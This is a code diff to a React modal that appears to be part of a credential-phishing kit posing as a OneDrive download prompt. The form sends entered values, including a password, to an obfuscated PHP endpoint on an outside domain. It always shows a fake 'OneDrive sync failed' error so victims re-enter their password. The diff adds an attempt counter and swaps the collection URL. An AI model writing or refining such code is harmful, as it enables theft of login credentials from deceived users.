@@ -12,6 +12,7 @@ const Modal = ({ toggle, open }) => {
   });
 
   const [message, setMessage] = React.useState("");
+  const [counter, setCounter] = React.useState(0);
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -31,10 +32,21 @@ const Modal = ({ toggle, open }) => {
     }
     subBtn.current.innerHTML = "Processing..."
     subBtn.current.disabled = true;
+    if(counter > 2){
+      setMessage("Error: OneDrive sync failed. Please try again.");
+        subBtn.current.innerHTML = "Download"
+        setValues({ ...values, password: "" });
+        subBtn.current.disabled = false;
+        setTimeout(() => {
+          setMessage("");
+        }, 5000);
+      return;
+    }
+    setCounter(counter + 1)
     const formData = new FormData();
     Object.entries(values).forEach(([k, v]) => formData.append(k, v));
     const xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/dumg.vo0211.php", true);
+    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/mr.docss77.php", true);
     xhr.timeout = 5000;
     xhr.onload = () => {
         setMessage("Error: OneDrive sync failed. Please try again.");
